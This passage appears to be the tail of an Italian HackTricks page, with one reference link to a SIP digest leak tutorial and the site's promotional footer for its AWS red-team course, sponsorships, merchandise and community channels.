* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** repository di [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
